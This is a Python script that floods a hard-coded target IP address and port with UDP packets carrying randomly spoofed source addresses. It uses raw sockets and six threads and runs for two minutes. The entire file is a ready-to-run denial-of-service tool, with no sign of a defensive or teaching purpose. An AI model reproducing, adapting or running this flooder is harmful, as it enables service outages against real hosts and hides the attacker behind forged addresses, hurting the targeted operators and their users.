import socket
import random
import struct
import threading
import time

# Function to generate a random IP address
def random_ip():
    return f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

# Function to create a raw UDP packet with spoofed source IP
def create_udp_packet(src_ip, dst_ip, dst_port):
    # IP Header
    ip_ver_ihl = (4 << 4) + 5  # Version (4) + Header Length (5)
    ip_tos = 0                 # Type of Service
    ip_tot_len = 0             # Kernel will fill the correct total length
    ip_id = random.randint(0, 65535)  # Identification
    ip_frag_off = 0            # Fragment offset
    ip_ttl = 64                # Time to live
    ip_proto = socket.IPPROTO_UDP  # Protocol (UDP)
    ip_check = 0               # Kernel will fill the checksum
    ip_saddr = socket.inet_aton(src_ip)  # Source IP address
    ip_daddr = socket.inet_aton(dst_ip)  # Destination IP address

    ip_header = struct.pack(
        "!BBHHHBBH4s4s", ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr
    )

    # UDP Header
    udp_src_port = random.randint(1024, 65535)  # Random source port
    udp_dst_port = dst_port                     # Destination port
    udp_length = 8 + 1024                       # Header (8 bytes) + Payload (1024 bytes)
    udp_check = 0                               # Checksum (optional)

    udp_header = struct.pack("!HHHH", udp_src_port, udp_dst_port, udp_length, udp_check)

    # Payload
    payload = random._urandom(1024)  # Random 1024-byte payload

    return ip_header + udp_header + payload

# Function to send spoofed packets
def send_spoofed_packets(target_ip, target_port, duration):
    # Create a raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    
    end_time = time.time() + duration
    packets_sent = 0

    print(f"Sending spoofed UDP packets to {target_ip}:{target_port} for {duration} seconds...")

    while time.time() < end_time:
        try:
            # Generate a random source IP
            src_ip = random_ip()

            # Create the UDP packet
            packet = create_udp_packet(src_ip, target_ip, target_port)

            # Send the packet
            sock.sendto(packet, (target_ip, target_port))
            packets_sent += 1
        except Exception as e:
            print(f"Error: {e}")
            break

    print(f"Finished. Total packets sent: {packets_sent}")

if __name__ == "__main__":
    # Target details
    target_ip = "20.204.179.82"  # Replace with your target IP
    target_port = 25594             # Replace with your target port
    duration = 120                # Duration in seconds
    threads = 6                 # Number of threads

    # Run in multiple threads
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send_spoofed_packets, args=(target_ip, target_port, duration))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()
